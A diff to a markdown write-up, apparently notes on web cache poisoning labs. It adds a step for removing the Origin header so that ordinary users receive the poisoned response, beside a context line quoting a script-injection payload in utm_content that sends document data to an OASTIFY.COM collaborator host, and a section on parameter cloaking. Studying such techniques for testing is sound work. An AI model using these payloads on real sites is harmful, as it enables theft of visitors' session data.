@@ -1141,6 +1141,8 @@ GET /?utm_content='/><script>document.location="https://OASTIFY.COM?c="+document
 
 ![example3](images/alertFunc.png)
 
+>Last part will be to delete `Origin` header and make the same process with the original request so normal users are victims (the original request that normal website users make is done without `Origin` header). 
+
 ### Cloaking utm_content  
 
 >Param Miner extension doing a `Bulk scan > Rails parameter cloaking scan` will ***identify*** the vulnerability automatically. Manually it can be identified by adding `;` to append another parameter to `utm_content`, the cache treats this as a single parameter. This means that the extra parameter is also excluded from the cache key.  
